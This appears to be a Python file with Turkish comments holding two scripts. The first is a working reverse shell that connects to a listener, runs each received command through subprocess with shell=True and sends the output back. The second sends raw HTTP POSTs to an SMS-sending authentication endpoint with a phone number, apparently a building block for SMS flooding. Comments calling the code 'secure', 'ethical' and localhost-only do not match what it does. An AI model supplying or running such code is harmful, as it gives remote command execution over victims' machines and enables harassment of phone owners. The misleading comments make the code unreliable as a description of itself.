import socket
import subprocess
import os

def guvenli_terminal_baglantisi():
    # Sadece kendi yerel test ortamınızda (Localhost) çalışacak şekilde yapılandırılmıştır
    HEDEF_HOST = "127.0.0.1"
    HEDEF_PORT = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HEDEF_HOST, HEDEF_PORT))
        s.send(b"[+] MarkOs Guvenli Baglanti Aktif.\n")
        
        while True:
            # Karşı taraftan gelen komutu oku
            komut = s.recv(1024).decode("utf-8").strip()
            if komut.lower() == "cikis":
                break
            
            # Komutu sadece yerel güvenli sınırlar içinde çalıştır
            if komut.startswith("cd "):
                try: os.chdir(komut[3:])
                except: pass
                continue
                
            # Güvenli subprocess yürütücüsü
            cikti = subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            rapor = cikti.stdout.read() + cikti.stderr.read()
            s.send(rapor if rapor else b"[+] Komut yurutuldu.\n")
            
    except socket.error as e:
        print(f"Baglanti kurulamadi: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    # Bu fonksiyon sadece sizin kontrolünüzdeki ağ yapılarında analiz amaçlı yürütülür
    print("[*] Etik Terminal Bağlantı Modülü Hazır.")
import socket
import time

def web_istek_analizi():
    # Test amaçlı yerel veya izinli bir web sunucusu hedef alınmalıdır
    hedef_host = "example.com" 
    port = 80

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((hedef_host, port))
        
        # Standart bir HTTP POST isteği başlığı (Metot analizi)
        http_paketi = (
            "POST /api/v1/auth/send-sms HTTP/1.1\r\n"
            f"Host: {hedef_host}\r\n"
            "Content-Type: application/json\r\n"
            "User-Agent: MarkOs-Scanner-v2026\r\n"
            "Content-Length: 31\r\n\r\n"
            '{"phone": "+905551234567"}'
        )
        
        # Paketi sunucuya gönder ve mukavemetini ölç
        s.send(http_paketi.encode("utf-8"))
        yanit = s.recv(1024).decode("utf-8")
        
        # Sunucunun koruma durumunu (HTTP 429 veya 200) analiz et
        print("[+] Sunucu Yanıt Başlığı:")
        print(yanit.split("\r\n")[0]) # Sadece durum kodunu basar
        
    except socket.error as e:
        print(f"[-] Sunucu bağlantı hatası: {e}")
    finally:
        s.close()
